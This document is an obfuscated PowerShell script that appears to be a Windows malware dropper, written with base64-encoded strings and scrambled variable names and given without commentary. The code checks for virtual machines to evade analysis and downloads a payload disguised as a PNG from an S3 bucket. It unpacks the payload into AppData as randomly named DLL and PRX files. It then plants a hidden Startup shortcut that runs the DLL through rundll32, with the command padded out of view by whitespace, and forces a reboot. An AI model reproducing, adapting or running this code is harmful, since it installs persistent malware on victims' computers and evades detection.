${____/===\/=====\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHMAMwAtAGUAdQAtAHcAZQBzAHQALQAxAC4AYQBtAGEAegBvAG4AYQB3AHMALgBjAG8AbQAvAGoAdQByAGUAbQBhAHMAbwBiAHIAYQAyAC8AaQBtAGEAZwBlADIALgBwAG4AZwA===')))
_.dll = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwAuAGQAbABsAA==')))
_.prx = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwAuAHAAcgB4AA==')))
MaxNotify   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgATgBvAHQAaQBmAHkA')))

function _/=\/\/===\/==\___
{
  ${_/\___/=\_/\/\__/} = gwmi -Class Win32_ComputerSystem |select -ExpandProperty Model
  if (${_/\___/=\_/\/\__/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABCAG8AeAA='))) -or
    ${_/\___/=\_/\/\__/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBNAHcAYQByAGUAIABWAGkAcgB0AHUAYQBsACAAUABsAGEAdABmAG8AcgBtAA=='))) -or
    ${_/\___/=\_/\/\__/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbAAgAE0AYQBjAGgAaQBuAGUA'))) -or
  ${_/\___/=\_/\/\__/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABWAE0AIABkAG8AbQBVAA=='))))
  {
    return "Y"
  }
  else
  { 
    return "N"
  }
}
function ____/\__/===\_/=\/
{
  try
  {
    ${___/\_/=\_/=\_/\/} = Get-Random -Minimum 1 -Maximum 9
    ${_/\/\_/\/\_/=\/\/} = ""
    For (${/==\/\___/\_/\/==}=0; ${/==\/\___/\_/\/==} -le ${___/\_/=\_/=\_/\/}; ${/==\/\___/\_/\/==}++) 
    {
      qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cQB3AGUAcgB0AHkAdQBpAG8AcABsAGsAagBoAGcAZgBkAHMAYQB6AHgAYwB2AGIAbgBtAFEAVwBFAFIAVABZAFUASQBPAFAAQQBTAEQARgBHAEgASgBLAEwAWgBYAEMAVgBCAE4ATQA=')))
      nomeRandomico_getrandom  = Get-Random -Minimum 1 -Maximum qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM.Length
      caractereRandomico = qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM.Substring(nomeRandomico_getrandom,1)
      ${_/\/\_/\/\_/=\/\/} = ${_/\/\_/\/\_/=\/\/}+caractereRandomico   
    }
    return ${_/\/\_/\/\_/=\/\/} 
  }
  finally{}
}
function __/====\___/=\_/\_(${___/\/\_/\_/=\__/\}, ${___/==\/=\/=\____/})
{ 
    ${/=\_/\/====\/\_/\} = New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBVAHIAaQA='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAC8AXAAvAFwAXwAvAFwAXwAvAD0AXABfAF8ALwBcAH0A'))) 
    ${/=\/===\_/\/\_/\_} = [System.Net.HttpWebRequest]::Create(${/=\_/\/====\/\_/\}) 
    ${/=\/===\_/\/\_/\_}.set_Timeout(15000) 
    ${/=\/====\__/==\__} = ${/=\/===\_/\/\_/\_}.GetResponse() 
    ${/=\_/==\__/\__/\_} = [System.Math]::Floor(${/=\/====\__/==\__}.get_ContentLength()/1024) 
    ${_/===\/=\_/=\___/} = ${/=\/====\__/==\__}.GetResponseStream() 
    ${__/====\__/\/\__/} = New-Object -TypeName System.IO.FileStream -ArgumentList ${___/==\/=\/=\____/}, Create 
    ${/=\/=\/==\_/\/=\_} = new-object byte[] 10KB 
    ${_/===\_/=\/\/===\} = ${_/===\/=\_/=\___/}.Read(${/=\/=\/==\_/\/=\_},0,${/=\/=\/==\_/\/=\_}.length) 
    ${/==\_/===\/\/=\/\} = ${_/===\_/=\/\/===\} 
    while (${_/===\_/=\/\/===\} -gt 0) 
    { 
        ${__/====\__/\/\__/}.Write(${/=\/=\/==\_/\/=\_}, 0, ${_/===\_/=\/\/===\}) 
        ${_/===\_/=\/\/===\} = ${_/===\/=\_/=\___/}.Read(${/=\/=\/==\_/\/=\_},0,${/=\/=\/==\_/\/=\_}.length) 
        ${/==\_/===\/\/=\/\} = ${/==\_/===\/\/=\/\} + ${_/===\_/=\/\/===\} 
    } 
    ${__/====\__/\/\__/}.Flush()
    ${__/====\__/\/\__/}.Close() 
    ${__/====\__/\/\__/}.Dispose() 
    ${_/===\/=\_/=\___/}.Dispose() 
    return "Y"
} 
function _____/==\_/=\_/===
{
  Param([string]${_/=====\/==\/\___/},[string]${___/\____/\_/=\/\_});
  try{  
    ${_/\/=\/\/===\/\/\} = New-Object -ComObject WScript.Shell 
    ${/=\/=\/\/=\_/=\__} = ${_/\/=\/\/===\/\/\}.CreateShortcut(${_/=====\/==\/\___/}) 
    ${/=\/=\/\/=\_/=\__}.TargetPath = 'powershell'
    ${/=\/=\/\/=\_/=\__}.Arguments = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAC8AXABfAF8AXwBfAC8AXABfAC8APQBcAC8AXABfAH0A')))
    ${/=\/=\/\/=\_/=\__}.WorkingDirectory = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBTAHkAcwB0AGUAbQBSAG8AbwB0ACUAXABTAHkAcwB0AGUAbQAzADIA'))) 
    ${/=\/=\/\/=\_/=\__}.WindowStyle = 7   
    ${/=\/=\/\/=\_/=\__}.IconLocation = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwAlAFwASQBuAHQAZQByAG4AZQB0ACAARQB4AHAAbABvAHIAZQByAFwAaQBlAHgAcABsAG8AcgBlAC4AZQB4AGUALAAxAA==')))
    ${/=\/=\/\/=\_/=\__}.Save()
  }finally{}
}
function _/=\/\_/\/===\_/==
{
  try
  {
    ${_/======\_/\/=\/\} = New-Object System.Threading.Mutex($false, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA0ADQANAA0ADQANAA0ADQANAA0ADQA'))))
    return ${_/======\_/\/=\/\}.WaitOne()  
  }finally{}
}
  if (_/=\/\/===\/==\___ -eq "N")
  {
  if (_/=\/\_/\/===\_/==)  {
     stop-process -name wmplayer 
    ${___/\/===\____/\/} = ${env:APPDATA}+"\"
    ${/=\______/=\/==\/} = ____/\__/===\_/=\/
    ${/===\/=\/\_/=\/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB0AHgAdAA=')))
    ${_/=\/===\/\___/\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB2AGIAcwA=')))
    ${/=\/==\__/\_/\__/}  = ${___/\/===\____/\/}+${/=\______/=\/==\/}+${/===\/=\/\_/=\/==}
    ${/=\__/=\___/===\_}  = ${___/\/===\____/\/}+${/=\______/=\/==\/}+${_/=\/===\/\___/\_} 
    sleep -s 1
        ${/===\/\_/====\/=\}  = $false
        while(${/===\/\_/====\/=\} -ne $true)
        {
        __/====\___/=\_/\_ ${____/===\/=====\/} ${/=\/==\__/\_/\__/}; sleep -s 1 
        if ((gi ${/=\/==\__/\_/\__/}).length -gt 2048kb)
         {
           ${/===\/\_/====\/=\}  = $true                                                          
           ${_/=\_/==\/=\__/\_} =  "Y" 
          } 
          else 
           {                     
            ${_/=\_/==\/=\__/\_} = "N"
           }
        Write-Host ${/===\/\_/====\/=\}
        }  
       ${_/=\_/==\/=\__/\_} =  "Y" 
        if (${_/=\_/==\/=\__/\_} -eq "Y")
          {
          ${/===\__/\/==\_/==} = ${___/\/===\____/\/}+${/=\______/=\/==\/} +$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB6AGkAcAA=')))
           ren -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAC8APQA9AFwAXwBfAC8AXABfAC8AXABfAF8ALwB9AA=='))) -NewName $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AD0AXABfAF8ALwBcAC8APQA9AFwAXwAvAD0APQB9AA==')));
          ${/=\_/=\_/===\___/} = New-Object -ComObject shell.application
          ${_/\___/\_/======\} = ${/=\_/=\_/===\___/}.NameSpace(${/===\__/\/==\_/==})               
            foreach (${_/====\/\_/\/\__/} in ${_/\___/\_/======\}.items()) 
             {
                ${/=\_/=\_/===\___/}.Namespace(${___/\/===\____/\/}).CopyHere(${_/====\/\_/\/\__/})
             }
          sleep -s 3 
          ${_/\_/=\_/=\_/\___} = ____/\__/===\_/=\/
          ${/=\_/===\/\_/===\} = ${_/\_/=\_/=\_/\___} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAHIAeAA='))) 
          ${_/\_/=\_/=\_/\___} = ${_/\_/=\_/=\_/\___} +$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBkAGwAbAA='))) 
          ren -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXAAkAHsAXwAvAFwALwBcAF8ALwBcAF8ALwA9AFwALwA9AD0APQA9AH0A'))) -NewName $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXAAkAHsAXwAvAFwAXwAvAD0AXABfAC8APQBcAF8ALwBcAF8AXwBfAH0A'))); 
          ren -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXAAkAHsAXwAvAFwAXwBfAF8AXwAvAD0AXAAvAFwAXwAvAD0APQA9AH0A'))) -NewName $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXAAkAHsALwA9AFwAXwAvAD0APQA9AFwALwBcAF8ALwA9AD0APQBcAH0A')));  
          sleep -s 3 
          cd $env:APPDATA ; 
          shellObjeto = New-Object -Com WScript.Shell
          ${_/=\/\/\/=\__/\/=} = shellObjeto.SpecialFolders.Item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGEAcgB0AHUAcAA='))));          
          del ${_/=\/\/\/=\__/\/=}\*.vbs
          del ${_/=\/\/\/=\__/\/=}\*.lnk
          ${/=\______/\_/\_/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBkACAAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAByAHUAbgBkAGwAbAAzADIALgBlAHgAZQAgACQAewBfAC8AXABfAC8APQBcAF8ALwA9AFwAXwAvAFwAXwBfAF8AfQAsACAAJAB7AF8AXwBfAC8APQBcAC8AXAAvAFwAXwBfAF8AXwBfAC8APQB9AA==')))
          ${___/=\/==\/\_____} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AFwALwBcAC8AXAAvAD0AXABfAF8ALwBcAC8APQB9AFwAJAB7AC8APQBcAF8ALwA9AD0APQBcAC8AXABfAC8APQA9AD0AXAB9AC4AbABuAGsA')))          
          _____/==\_/=\_/=== ${___/=\/==\/\_____}  ${/=\______/\_/\_/=}
          sleep -s 40
Restart-Computer -Force
        }
    }
  }
  